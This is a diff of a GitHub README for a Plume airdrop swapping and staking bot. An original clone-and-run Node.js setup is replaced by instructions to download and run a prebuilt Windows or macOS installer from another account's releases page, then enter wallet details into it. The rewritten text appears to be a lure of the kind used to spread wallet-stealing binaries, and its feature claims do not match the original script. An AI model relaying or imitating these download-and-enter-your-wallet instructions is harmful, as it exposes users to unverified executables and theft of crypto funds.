@@ -1,71 +1,84 @@
-# 🔄 UPDATE Plume Genesis Airdrop Bot Season 2
+# 🤖 Plume-Genesis-Airdrop-Bot-Season-2 - Automate Your Airdrop Experience
 
-A lightweight Node.js bot for Plume Airdrop Season 2. Automates PLUME ↔ pUSD swaps across 3 DEX (Ambient, Rooster, iZUMi) with randomized configs and daily auto-staking to Plume Portal.
+## 🌟 Overview
+The Plume-Genesis-Airdrop-Bot-Season-2 is a tool designed to streamline your participation in the Plume Airdrop Season 2. This bot automates swaps between PLUME and pUSD across three decentralized exchanges (DEX): Ambient, Rooster, and iZUMi. With this application, you can set up randomized configurations and benefit from daily auto-staking directly to the Plume Portal. 
 
-<img width="774" height="221" alt="image" src="https://github.com/user-attachments/assets/428fe42c-5e21-4a56-8258-311a84432ed4" />
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Hibimi8/Plume-Genesis-Airdrop-Bot-Season-2/releases)
 
-## 🚀 New Features
-- Randomized daily swaps across 3 DEXs: Ambient, Rooster, and iZUMi.
+## 🚀 Getting Started
 
-- Swap amounts and delays are randomized and fully configurable via the .env file.
+### 📋 System Requirements
+To run the Plume Airdrop Bot smoothly, ensure your system meets these basic requirements:
 
-- Auto-stakes to the Plume Portal daily with a random amount between 0.1 and 0.3 PLUME.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later
+- **RAM:** Minimum of 4GB
+- **Disk Space:** At least 500MB of free space
+- **Internet Connection:** Stable broadband connection 
 
-- Designed to maximize points for Plume Airdrop Season 2.
+### ⚙️ Installation Steps
+1. **Visit the Download Page:** Access the releases page by following this link: [Download Page](https://github.com/Hibimi8/Plume-Genesis-Airdrop-Bot-Season-2/releases).
+   
+2. **Choose the Latest Version:** Look for the latest release at the top of the page. 
 
-## 📦 Installation
-Clone the repository and install dependencies:
+3. **Download the Installer:** Click on the installer file that matches your operating system to start the download.
 
-```bash
-git clone https://github.com/rihuta/Plume-Genesis-Airdrop-Bot-Season-2.git
-```
-```bash
-cd Plume-Genesis-Airdrop-Bot-Season-2
-```
-```bash
-npm install
-```
+4. **Run the Installer:** Once downloaded, locate the file in your Downloads folder and double-click it to run the installer.
 
-⚙️ Environment Setup
-Create a .env file in the project root:
-```bash
-nano .env
-```
-Fill in your wallet details and configure your preferred settings:
-```bash
-PLUME_RPC=https://rpc.plume.org
+5. **Follow Installation Prompts:** Complete the installation by following the on-screen instructions. 
 
-PRIVATE_KEY_1=0xyour_private_key
-WALLET_ADDRESS_1=0xyour_address
+6. **Launch the Application:** After installation, find the Plume Airdrop Bot in your applications and open it.
 
-# you can change
-MIN_PLUME=10
-MAX_PLUME=30
+### 📥 Download & Install
+Once you have completed the installation steps, you can get back to the [Download Page](https://github.com/Hibimi8/Plume-Genesis-Airdrop-Bot-Season-2/releases) for any updates or new versions.
 
-# you can change
-MIN_TX=10
-MAX_TX=30
+## 🔍 Using the Bot
 
-# you can change
-MIN_DELAY=60
-MAX_DELAY=120
-```
+### 🎛️ Setting Up the Bot
+1. **Initial Configuration:** Upon first launch, the bot will ask you to enter your wallet details. This is necessary for executing swaps and staking.
+   
+2. **Adjust Settings:** You can customize various settings, such as swap limits and preferred DEX. Take your time to familiarize yourself with the options available.
 
-## ▶️ Running the Bot
-To start the bot:
-```bash
-node index.js
-```
-What the bot does:
+3. **Activate Random Configs:** Enable the randomized configurations for diversified trading strategies. This feature allows the bot to operate efficiently across different exchanges.
 
-- Randomly selects between Ambient, Rooster, and iZUMi DEXs for daily swaps.
+### 💬 Staking and Swapping
+- **Swapping:** The bot will automatically detect optimal times for swapping PLUME and pUSD based on market conditions.
+  
+- **Daily Auto-Staking:** The auto-staking feature sends your earnings directly to the Plume Portal without manual intervention.
 
-- Executes a random number of swap transactions with randomized token amounts and delays.
+## 🆘 Troubleshooting
 
-- Automatically stakes a random amount (0.1 – 0.3 PLUME) daily to the Plume Portal to earn airdrop points.
+### 🚧 Common Issues
+- **Installation Problems:** If the application fails to install, make sure your system meets the requirements outlined in the Installation Steps.
 
-## 🎯 Goal
-Maximize your engagement with the Plume ecosystem and boost your chances of earning more rewards from Plume Airdrop Season 2 — automatically.
+- **Connection Errors:** Ensure your internet connection is stable and that your firewall isn’t blocking the bot.
 
-## 🔖 Tags
-#plume #airdrop #swap #bot #crypto #web3 #automation #trading #pUSD #dex #stake 
+- **Swap Failures:** If a swap fails, check your wallet balance and ensure that you have sufficient funds for the transaction fees.
+
+### 📞 Support
+For any further assistance, you can reach support by opening an issue on the [GitHub Issues Page](https://github.com/Hibimi8/Plume-Genesis-Airdrop-Bot-Season-2/issues). 
+
+## ⚖️ License
+This project is licensed under the MIT License. You are free to use, modify, and distribute the application, provided that proper credit is given to the original authors.
+
+## 🗞️ Release Notes
+Be sure to check the release notes on the downloads page for new features and bug fixes.
+
+### 🔗 Important Links
+- [Download the Bot](https://github.com/Hibimi8/Plume-Genesis-Airdrop-Bot-Season-2/releases)
+- [GitHub Repository](https://github.com/Hibimi8/Plume-Genesis-Airdrop-Bot-Season-2)
+
+## 📑 Topics
+- airdrop
+- automation
+- bot
+- crypto
+- dex
+- plume
+- plume-airdrop
+- plume-portal
+- pusd
+- stake
+- swap
+- trading
+- web3
